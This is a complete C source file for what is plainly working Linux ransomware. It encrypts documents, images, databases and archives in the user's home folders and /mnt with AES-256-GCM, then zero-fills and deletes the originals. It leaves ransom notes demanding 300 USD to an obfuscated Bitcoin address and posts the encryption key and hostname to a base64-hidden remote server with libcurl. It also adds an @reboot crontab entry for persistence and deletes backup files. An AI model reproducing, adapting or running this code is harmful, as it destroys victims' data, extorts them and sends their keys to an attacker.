#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <limits.h>
#include <ctype.h>
#include <stddef.h>
#include <stdint.h>

#include <openssl/rand.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <curl/curl.h>

#define MASTER_KEY_PATH "/tmp/.master.key"
#define SESSION_KEY_SIZE 32

static int write_all(int fd, const void *buf, size_t len)
{
    const char *p = (const char *)buf;

    while (len > 0) {
        ssize_t n = write(fd, p, len);

        if (n < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }

        if (n == 0) {
            errno = EIO;
            return -1;
        }

        p += n;
        len -= (size_t)n;
    }

    return 0;
}

const uint8_t *init_session_key(void)
{
    uint8_t *key = NULL;
    char *json = NULL;
    char b64[EVP_ENCODE_LENGTH(SESSION_KEY_SIZE)];
    int fd = -1;
    int b64_len;
    size_t json_len;
    int n;

    key = (uint8_t *)malloc(SESSION_KEY_SIZE);
    if (key == NULL) {
        fprintf(stderr, "init_session_key: failed to allocate key buffer\n");
        return NULL;
    }

    if (RAND_bytes((unsigned char *)key, SESSION_KEY_SIZE) != 1) {
        fprintf(stderr, "init_session_key: RAND_bytes failed\n");
        ERR_print_errors_fp(stderr);
        goto fail;
    }

    b64_len = EVP_EncodeBlock((unsigned char *)b64,
                              (const unsigned char *)key,
                              SESSION_KEY_SIZE);
    if (b64_len <= 0) {
        fprintf(stderr, "init_session_key: EVP_EncodeBlock failed\n");
        goto fail;
    }

    json_len = 12 + (size_t)b64_len + 2;

    json = (char *)malloc(json_len + 1);
    if (json == NULL) {
        fprintf(stderr, "init_session_key: failed to allocate JSON buffer\n");
        goto fail;
    }

    n = snprintf(json, json_len + 1, "{\"aes_key\":\"%s\"}", b64);
    if (n < 0 || (size_t)n != json_len) {
        fprintf(stderr, "init_session_key: failed to build JSON payload\n");
        goto fail;
    }

    fd = open(MASTER_KEY_PATH,
              O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC | O_NOFOLLOW,
              0600);
    if (fd < 0) {
        perror("init_session_key: open " MASTER_KEY_PATH);
        goto fail;
    }

    if (fchmod(fd, 0600) != 0) {
        perror("init_session_key: fchmod " MASTER_KEY_PATH);
        goto fail;
    }

    if (write_all(fd, json, json_len) != 0) {
        perror("init_session_key: write " MASTER_KEY_PATH);
        goto fail;
    }

    if (fsync(fd) != 0) {
        perror("init_session_key: fsync " MASTER_KEY_PATH);
        goto fail;
    }

    if (close(fd) != 0) {
        perror("init_session_key: close " MASTER_KEY_PATH);
        (void)unlink(MASTER_KEY_PATH);
        fd = -1;
        goto fail;
    }
    fd = -1;

    free(json);
    return key;

fail:
    if (fd >= 0) {
        (void)close(fd);
        (void)unlink(MASTER_KEY_PATH);
    }

    free(json);
    free(key);
    return NULL;
}

static const char *extensoes[] = {
    ".xlsx", ".docx", ".pdf", ".txt", ".csv",
    ".jpg",  ".png",  ".db",  ".backup",
    ".psd",  ".zip",  ".rar", NULL
};

void free_file_list(char **list, int count);

static int extensao_valida(const char *path) {
    const char *ext = strrchr(path, '.');
    if (!ext) return 0;
    for (int i = 0; extensoes[i] != NULL; i++) {
        if (strcasecmp(ext, extensoes[i]) == 0)
            return 1;
    }
    return 0;
}

static char *expandir_tilde(const char *path) {
    if (path[0] == '~' && (path[1] == '/' || path[1] == '\0')) {
        const char *home = getenv("HOME");
        if (!home) {
            fprintf(stderr, "AVISO: variavel HOME nao definida\n");
            return strdup(path);
        }
        size_t len = strlen(home) + strlen(path + 1) + 1;
        char *resultado = malloc(len);
        if (!resultado) {
            perror("malloc");
            return NULL;
        }
        snprintf(resultado, len, "%s%s", home, path + 1);
        return resultado;
    }
    return strdup(path);
}

static int enumerate_recursive(const char *dir_path,
                                char ***list,
                                int *count,
                                int *capacity) {
    DIR *dir = opendir(dir_path);
    if (!dir) {
        fprintf(stderr, "AVISO: nao foi possivel abrir %s: %s\n",
                dir_path, strerror(errno));
        return 0;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char caminho[PATH_MAX];
        int ret = snprintf(caminho, sizeof(caminho), "%s/%s", dir_path, entry->d_name);
        if (ret < 0 || ret >= (int)sizeof(caminho)) {
            fprintf(stderr, "AVISO: caminho muito longo: %s/%s\n", dir_path, entry->d_name);
            continue;
        }

        struct stat st;
        if (lstat(caminho, &st) == -1) {
            fprintf(stderr, "AVISO: nao foi possivel estat %s: %s\n",
                    caminho, strerror(errno));
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            if (enumerate_recursive(caminho, list, count, capacity) != 0) {
                closedir(dir);
                return -1;
            }
        } else if (S_ISREG(st.st_mode) || S_ISLNK(st.st_mode)) {
            if (extensao_valida(entry->d_name)) {
                if (*count >= *capacity) {
                    int nova_cap = *capacity == 0 ? 1024 : (*capacity) * 2;
                    char **nova_lista = realloc(*list, nova_cap * sizeof(char *));
                    if (!nova_lista) {
                        perror("realloc");
                        closedir(dir);
                        return -1;
                    }
                    *list = nova_lista;
                    *capacity = nova_cap;
                }

                (*list)[*count] = strdup(caminho);
                if (!(*list)[*count]) {
                    perror("strdup");
                    closedir(dir);
                    return -1;
                }
                (*count)++;
            }
        }
    }

    closedir(dir);
    return 0;
}

char **enumerate_target_files(int *count) {
    if (!count) return NULL;
    *count = 0;

    const char *dirs_raw[] = {
        "~/Documentos_Teste",
        "~/Documentos",
        "~/Downloads",
        "~/Imagens",
        "/mnt",
        NULL
    };

    char **lista = NULL;
    int capacidade = 0;

    for (int i = 0; dirs_raw[i] != NULL; i++) {
        char *dir_exp = expandir_tilde(dirs_raw[i]);
        if (!dir_exp) {
            free_file_list(lista, *count);
            *count = 0;
            return NULL;
        }

        struct stat st;
        if (stat(dir_exp, &st) == -1) {
            fprintf(stderr, "AVISO: diretorio base %s nao acessivel: %s\n",
                    dir_exp, strerror(errno));
            free(dir_exp);
            continue;
        }

        if (!S_ISDIR(st.st_mode)) {
            fprintf(stderr, "AVISO: %s nao e um diretorio\n", dir_exp);
            free(dir_exp);
            continue;
        }

        if (enumerate_recursive(dir_exp, &lista, count, &capacidade) != 0) {
            free_file_list(lista, *count);
            *count = 0;
            free(dir_exp);
            return NULL;
        }

        free(dir_exp);
    }

    if (capacidade > *count && *count > 0) {
        char **compactado = realloc(lista, *count * sizeof(char *));
        if (compactado) lista = compactado;
    } else if (*count == 0 && lista) {
        free(lista);
        lista = NULL;
    }

    return lista;
}

void free_file_list(char **list, int count) {
    if (!list) return;
    for (int i = 0; i < count; i++) {
        free(list[i]);
    }
    free(list);
}

int process_file(const char *filepath, const uint8_t *session_key) {
    int ret = -1;
    FILE *fin = NULL, *fout = NULL;
    char *outpath = NULL;
    uint8_t nonce[12];
    EVP_CIPHER_CTX *ctx = NULL;
    uint8_t *plainbuf = NULL, *cipherbuf = NULL;
    struct stat st;
    long filesize = 0;
    size_t bytes_read;
    int outlen;
    uint8_t tag[16];

    if (stat(filepath, &st) != 0) {
        perror("stat");
        goto cleanup;
    }
    filesize = st.st_size;

    fin = fopen(filepath, "rb");
    if (!fin) {
        perror("fopen (input)");
        goto cleanup;
    }

    outpath = malloc(strlen(filepath) + 12);
    if (!outpath) {
        perror("malloc");
        goto cleanup;
    }
    sprintf(outpath, "%s.PROCESSED", filepath);

    fout = fopen(outpath, "wb");
    if (!fout) {
        perror("fopen (output)");
        goto cleanup;
    }

    if (RAND_bytes(nonce, sizeof(nonce)) != 1) {
        fprintf(stderr, "RAND_bytes failed\n");
        goto cleanup;
    }

    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        fprintf(stderr, "EVP_CIPHER_CTX_new failed\n");
        goto cleanup;
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        fprintf(stderr, "EVP_EncryptInit_ex (cipher) failed\n");
        goto cleanup;
    }

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1) {
        fprintf(stderr, "EVP_CIPHER_CTX_ctrl (SET_IVLEN) failed\n");
        goto cleanup;
    }

    if (EVP_EncryptInit_ex(ctx, NULL, NULL, session_key, nonce) != 1) {
        fprintf(stderr, "EVP_EncryptInit_ex (key/IV) failed\n");
        goto cleanup;
    }

    if (fwrite(nonce, 1, sizeof(nonce), fout) != sizeof(nonce)) {
        perror("fwrite (nonce)");
        goto cleanup;
    }

    const size_t CHUNK = 4096;
    plainbuf = malloc(CHUNK);
    cipherbuf = malloc(CHUNK + EVP_MAX_BLOCK_LENGTH);
    if (!plainbuf || !cipherbuf) {
        perror("malloc (buffers)");
        goto cleanup;
    }

    while ((bytes_read = fread(plainbuf, 1, CHUNK, fin)) > 0) {
        if (EVP_EncryptUpdate(ctx, cipherbuf, &outlen, plainbuf, bytes_read) != 1) {
            fprintf(stderr, "EVP_EncryptUpdate failed\n");
            goto cleanup;
        }
        if (outlen > 0 && fwrite(cipherbuf, 1, outlen, fout) != (size_t)outlen) {
            perror("fwrite (ciphertext)");
            goto cleanup;
        }
    }
    if (ferror(fin)) {
        perror("fread");
        goto cleanup;
    }

    if (EVP_EncryptFinal_ex(ctx, cipherbuf, &outlen) != 1) {
        fprintf(stderr, "EVP_EncryptFinal_ex failed\n");
        goto cleanup;
    }
    if (outlen > 0 && fwrite(cipherbuf, 1, outlen, fout) != (size_t)outlen) {
        perror("fwrite (final ciphertext)");
        goto cleanup;
    }

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
        fprintf(stderr, "EVP_CIPHER_CTX_ctrl (GET_TAG) failed\n");
        goto cleanup;
    }

    if (fwrite(tag, 1, 16, fout) != 16) {
        perror("fwrite (tag)");
        goto cleanup;
    }

    fclose(fin);
    fin = NULL;
    fclose(fout);
    fout = NULL;

    FILE *fzero = fopen(filepath, "wb");
    if (!fzero) {
        perror("fopen (overwrite)");
        goto cleanup;
    }
    uint8_t zero_buf[4096] = {0};
    long remaining = filesize;
    while (remaining > 0) {
        size_t to_write = (remaining > (long)sizeof(zero_buf)) ? sizeof(zero_buf) : (size_t)remaining;
        if (fwrite(zero_buf, 1, to_write, fzero) != to_write) {
            perror("fwrite (zeros)");
            fclose(fzero);
            goto cleanup;
        }
        remaining -= (long)to_write;
    }
    fclose(fzero);

    if (remove(filepath) != 0) {
        perror("remove");
        goto cleanup;
    }

    ret = 0;

cleanup:
    free(outpath);
    free(plainbuf);
    free(cipherbuf);
    if (ctx) EVP_CIPHER_CTX_free(ctx);
    if (fin) fclose(fin);
    if (fout) fclose(fout);
    return ret;
}

static int
base64_decode_wm(const char *in, unsigned char *out, size_t out_size)
{
    size_t in_len = strlen(in);
    if (in_len % 4 != 0)
        return -1;

    size_t out_pos = 0;
    for (size_t i = 0; i < in_len; i += 4) {
        int v[4];
        for (int j = 0; j < 4; ++j) {
            char c = in[i + j];
            if (c >= 'A' && c <= 'Z')
                v[j] = c - 'A';
            else if (c >= 'a' && c <= 'z')
                v[j] = c - 'a' + 26;
            else if (c >= '0' && c <= '9')
                v[j] = c - '0' + 52;
            else if (c == '+')
                v[j] = 62;
            else if (c == '/')
                v[j] = 63;
            else if (c == '=')
                v[j] = -2;
            else
                return -1;
        }

        int padding = 0;
        if (v[2] == -2) {
            padding = 2;
            if (v[3] != -2)
                return -1;
        } else if (v[3] == -2) {
            padding = 1;
        }

        if (padding == 0) {
            if (out_pos + 3 > out_size)
                return -1;
            out[out_pos++] = (v[0] << 2) | (v[1] >> 4);
            out[out_pos++] = (v[1] << 4) | (v[2] >> 2);
            out[out_pos++] = (v[2] << 6) | v[3];
        } else if (padding == 2) {
            if (out_pos + 1 > out_size)
                return -1;
            out[out_pos++] = (v[0] << 2) | (v[1] >> 4);
        } else {
            if (out_pos + 2 > out_size)
                return -1;
            out[out_pos++] = (v[0] << 2) | (v[1] >> 4);
            out[out_pos++] = (v[1] << 4) | (v[2] >> 2);
        }
    }
    return 0;
}

void
write_manifest_notice(const char *directories[], size_t count)
{
    const char *b64_addr =
        "MUExelAxZVA1URdlZmkyRE1QVGZUTDVTTG12N0RpdmZOYQ==";

    unsigned char decoded_addr[64];
    if (base64_decode_wm(b64_addr, decoded_addr, sizeof(decoded_addr)) != 0) {
        fprintf(stderr, "Error: failed to decode Bitcoin address\n");
        return;
    }

    size_t b64_len = strlen(b64_addr);
    size_t effective = b64_len;
    while (effective > 0 && b64_addr[effective - 1] == '=')
        --effective;
    size_t addr_len = (effective / 4) * 3;
    decoded_addr[addr_len] = '\0';
    const char *addr = (const char *)decoded_addr;

    const char *prefix =
        "To recover your files, send 300 USD to the following Bitcoin address:\n";
    const char *suffix =
        "\nAfter payment, initiate contact via secure channel to receive decryption instructions.\n";

    size_t content_len = strlen(prefix) + addr_len + strlen(suffix) + 1;
    char *content = malloc(content_len);
    if (!content) {
        perror("malloc");
        return;
    }
    snprintf(content, content_len, "%s%s%s", prefix, addr, suffix);

    for (size_t i = 0; i < count; ++i) {
        const char *dir = directories[i];
        if (!dir)
            continue;

        char path[PATH_MAX];
        int ret = snprintf(path, sizeof(path), "%s/%s",
                           dir, "#_STATUS_NOTICE_#.txt");
        if (ret < 0 || (size_t)ret >= sizeof(path)) {
            fprintf(stderr, "Error: path too long for directory '%s'\n", dir);
            continue;
        }

        FILE *f = fopen(path, "w");
        if (!f) {
            fprintf(stderr, "Error: cannot create '%s': %s\n",
                    path, strerror(errno));
            continue;
        }

        if (fputs(content, f) == EOF) {
            fprintf(stderr, "Error: writing to '%s': %s\n",
                    path, strerror(errno));
        }
        fclose(f);
    }

    free(content);
}

static inline unsigned char base64_char_value(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    if (c == '=') return 64;
    return 255;
}

static char *base64_decode_pub(const char *data, size_t *out_len) {
    if (!data) return NULL;
    size_t len = strlen(data);
    if (len == 0 || len % 4 != 0) return NULL;

    size_t max_out = (len / 4) * 3 + 1;
    char *out = malloc(max_out);
    if (!out) return NULL;

    size_t i, j = 0;
    for (i = 0; i < len; i += 4) {
        unsigned char a = base64_char_value(data[i]);
        unsigned char b = base64_char_value(data[i+1]);
        unsigned char c = base64_char_value(data[i+2]);
        unsigned char d = base64_char_value(data[i+3]);

        if (a == 255 || b == 255 || c == 255 || d == 255) {
            free(out);
            return NULL;
        }

        out[j++] = (a << 2) | (b >> 4);
        if (c != 64)
            out[j++] = (b << 4) | (c >> 2);
        if (d != 64)
            out[j++] = (c << 6) | d;
    }
    out[j] = '\0';
    if (out_len) *out_len = j;
    return out;
}

int publish_key_data(void) {
    FILE *f = fopen("/tmp/.master.key", "rb");
    if (!f) {
        perror("fopen /tmp/.master.key");
        return -1;
    }
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    if (fsize <= 0) {
        fclose(f);
        return -1;
    }
    rewind(f);
    char *buf = malloc((size_t)fsize + 1);
    if (!buf) {
        fclose(f);
        return -1;
    }
    size_t nread = fread(buf, 1, (size_t)fsize, f);
    fclose(f);
    if (nread != (size_t)fsize) {
        free(buf);
        return -1;
    }
    buf[fsize] = '\0';

    char *key_start = strstr(buf, "\"aes_key\":\"");
    if (!key_start) {
        free(buf);
        fprintf(stderr, "aes_key field not found\n");
        return -1;
    }
    key_start += 10;
    char *key_end = strchr(key_start, '"');
    if (!key_end) {
        free(buf);
        fprintf(stderr, "closing quote not found\n");
        return -1;
    }
    size_t key_len = key_end - key_start;
    char *aes_key = malloc(key_len + 1);
    if (!aes_key) {
        free(buf);
        return -1;
    }
    strncpy(aes_key, key_start, key_len);
    aes_key[key_len] = '\0';
    free(buf);

    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        perror("gethostname");
        free(aes_key);
        return -1;
    }
    hostname[sizeof(hostname) - 1] = '\0';

    size_t json_len = 13 + key_len + 13 + strlen(hostname) + 3 + 1;
    char *json = malloc(json_len);
    if (!json) {
        free(aes_key);
        return -1;
    }
    snprintf(json, json_len, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", aes_key, hostname);
    free(aes_key);

    const char *encoded_url = "aHR0cDovLzEwLjI1NC4xOS43Mzo4MDgwL2NvbGxlY3Q=";
    size_t url_len;
    char *url = base64_decode_pub(encoded_url, &url_len);
    if (!url) {
        free(json);
        fprintf(stderr, "base64 decode failed\n");
        return -1;
    }

    CURL *curl = curl_easy_init();
    if (!curl) {
        free(json);
        free(url);
        fprintf(stderr, "curl_easy_init failed\n");
        return -1;
    }
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (!headers) {
        curl_easy_cleanup(curl);
        free(json);
        free(url);
        return -1;
    }
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json));

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform failed: %s\n", curl_easy_strerror(res));
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        free(json);
        free(url);
        return -1;
    }

    long response_code;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    free(url);

    if (response_code == 200) {
        if (remove("/tmp/.master.key") != 0) {
            perror("remove");
            free(json);
            return -1;
        }
    }

    free(json);
    return 0;
}

int schedule_autostart(const char *argv0) {
    char binary_path[PATH_MAX];
    size_t binlen;

    if (argv0 && strchr(argv0, '/')) {
        if (!realpath(argv0, binary_path)) {
            fprintf(stderr, "realpath failed: %s\n", strerror(errno));
            return -1;
        }
    } else {
        ssize_t len = readlink("/proc/self/exe", binary_path, sizeof(binary_path) - 1);
        if (len == -1 || len >= (ssize_t)(sizeof(binary_path) - 1)) {
            fprintf(stderr, "readlink /proc/self/exe failed: %s\n",
                    len == -1 ? strerror(errno) : "buffer too small");
            return -1;
        }
        binary_path[len] = '\0';
    }
    binlen = strlen(binary_path);

    FILE *fp = popen("crontab -l 2>/dev/null", "r");
    if (!fp) {
        fprintf(stderr, "popen(crontab -l) failed: %s\n", strerror(errno));
        return -1;
    }

    char **lines = NULL;
    size_t lines_cap = 0;
    size_t lines_cnt = 0;
    char *line = NULL;
    size_t line_len = 0;
    ssize_t read;

    while ((read = getline(&line, &line_len, fp)) != -1) {
        if (lines_cnt >= lines_cap) {
            size_t new_cap = lines_cap ? lines_cap * 2 : 256;
            char **new_lines = realloc(lines, new_cap * sizeof(char*));
            if (!new_lines) {
                fprintf(stderr, "realloc failed\n");
                free(line);
                for (size_t i = 0; i < lines_cnt; i++) free(lines[i]);
                free(lines);
                pclose(fp);
                return -1;
            }
            lines = new_lines;
            lines_cap = new_cap;
        }
        lines[lines_cnt] = strdup(line);
        if (!lines[lines_cnt]) {
            fprintf(stderr, "strdup failed\n");
            free(line);
            for (size_t i = 0; i < lines_cnt; i++) free(lines[i]);
            free(lines);
            pclose(fp);
            return -1;
        }
        lines_cnt++;
    }
    free(line);
    int pclose_ret = pclose(fp);
    if (pclose_ret == -1 || (pclose_ret != 0 && pclose_ret != 1)) {
        if (pclose_ret == -1) {
            fprintf(stderr, "pclose failed: %s\n", strerror(errno));
            for (size_t i = 0; i < lines_cnt; i++) free(lines[i]);
            free(lines);
            return -1;
        }
    }

    int found = 0;
    for (size_t i = 0; i < lines_cnt; i++) {
        const char *l = lines[i];
        size_t llen = strlen(l);
        if (llen > 0 && l[llen-1] == '\n') llen--;
        const char *prefix = "@reboot ";
        size_t plen = strlen(prefix);
        if (llen >= plen + binlen && memcmp(l, prefix, plen) == 0 && memcmp(l + plen, binary_path, binlen) == 0) {
            found = 1;
            break;
        }
    }

    if (found) {
        for (size_t i = 0; i < lines_cnt; i++) free(lines[i]);
        free(lines);
        return 0;
    }

    fp = popen("crontab -", "w");
    if (!fp) {
        fprintf(stderr, "popen(crontab -) failed: %s\n", strerror(errno));
        for (size_t i = 0; i < lines_cnt; i++) free(lines[i]);
        free(lines);
        return -1;
    }

    for (size_t i = 0; i < lines_cnt; i++) {
        size_t llen = strlen(lines[i]);
        if (llen > 0 && lines[i][llen-1] == '\n') {
            if (fputs(lines[i], fp) == EOF) {
                fprintf(stderr, "fputs error writing existing line\n");
                pclose(fp);
                for (size_t i = 0; i < lines_cnt; i++) free(lines[i]);
                free(lines);
                return -1;
            }
        } else {
            if (fprintf(fp, "%s\n", lines[i]) < 0) {
                fprintf(stderr, "fprintf error writing existing line\n");
                pclose(fp);
                for (size_t i = 0; i < lines_cnt; i++) free(lines[i]);
                free(lines);
                return -1;
            }
        }
    }

    if (fprintf(fp, "@reboot %s\n", binary_path) < 0) {
        fprintf(stderr, "fprintf error writing @reboot entry\n");
        pclose(fp);
        for (size_t i = 0; i < lines_cnt; i++) free(lines[i]);
        free(lines);
        return -1;
    }

    int pclose_ret2 = pclose(fp);
    if (pclose_ret2 == -1) {
        fprintf(stderr, "pclose failed: %s\n", strerror(errno));
        for (size_t i = 0; i < lines_cnt; i++) free(lines[i]);
        free(lines);
        return -1;
    }

    for (size_t i = 0; i < lines_cnt; i++) free(lines[i]);
    free(lines);
    return 0;
}

static void process_directory(const char *dir_path) {
    DIR *dir = opendir(dir_path);
    if (!dir) {
        fprintf(stderr, "Error opening directory '%s': %s\n", dir_path, strerror(errno));
        return;
    }

    struct dirent *entry;
    char full_path[PATH_MAX];
    struct stat st;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        int len = snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);
        if (len < 0 || (size_t)len >= sizeof(full_path)) {
            fprintf(stderr, "Path too long: %s/%s\n", dir_path, entry->d_name);
            continue;
        }

        if (stat(full_path, &st) < 0) {
            fprintf(stderr, "Error stating '%s': %s\n", full_path, strerror(errno));
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            process_directory(full_path);
        } else if (S_ISREG(st.st_mode)) {
            const char *ext = strrchr(entry->d_name, '.');
            if (ext) {
                if (strcmp(ext, ".bak") == 0 ||
                    strcmp(ext, ".backup") == 0 ||
                    strcmp(ext, ".old") == 0) {
                    if (remove(full_path) != 0) {
                        fprintf(stderr, "Error removing file '%s': %s\n",
                                full_path, strerror(errno));
                    }
                }
            }
        }
    }

    closedir(dir);
}

void purge_backup_files(void) {
    const char *home = getenv("HOME");
    if (!home) {
        fprintf(stderr, "HOME environment variable not set\n");
        return;
    }

    const char *dirs[] = {
        "Documentos_Teste",
        "Documentos",
        "Downloads",
        "Imagens",
        NULL
    };

    char path[PATH_MAX];

    for (int i = 0; dirs[i] != NULL; i++) {
        int len = snprintf(path, sizeof(path), "%s/%s", home, dirs[i]);
        if (len < 0 || (size_t)len >= sizeof(path)) {
            fprintf(stderr, "Path too long: %s/%s\n", home, dirs[i]);
            continue;
        }
        process_directory(path);
    }

    process_directory("/mnt");
}

int main(int argc, char *argv[])
{
    (void)argc;

    const uint8_t *key = init_session_key();
    if (!key) {
        fprintf(stderr, "main: init_session_key failed\n");
        return 1;
    }

    int file_count = 0;
    char **files = enumerate_target_files(&file_count);
    if (!files || file_count == 0) {
        fprintf(stderr, "main: no target files found\n");
    }

    for (int i = 0; i < file_count; i++) {
        fprintf(stdout, "Encrypting: %s\n", files[i]);
        if (process_file(files[i], key) != 0) {
            fprintf(stderr, "main: process_file failed for %s\n", files[i]);
        }
    }

    if (files && file_count > 0) {
        char **dirs = malloc((size_t)file_count * sizeof(char *));
        int dir_count = 0;
        for (int i = 0; i < file_count; i++) {
            char *slash = strrchr(files[i], '/');
            if (!slash) continue;
            size_t dirlen = (size_t)(slash - files[i]);
            char *dir = malloc(dirlen + 1);
            if (!dir) continue;
            memcpy(dir, files[i], dirlen);
            dir[dirlen] = '\0';
            int found = 0;
            for (int j = 0; j < dir_count; j++) {
                if (strcmp(dirs[j], dir) == 0) { found = 1; break; }
            }
            if (!found) {
                dirs[dir_count++] = dir;
            } else {
                free(dir);
            }
        }
        write_manifest_notice((const char **)dirs, (size_t)dir_count);
        for (int i = 0; i < dir_count; i++) free(dirs[i]);
        free(dirs);
    }

    free_file_list(files, file_count);

    publish_key_data();

    schedule_autostart(argv[0]);

    purge_backup_files();

    return 0;
}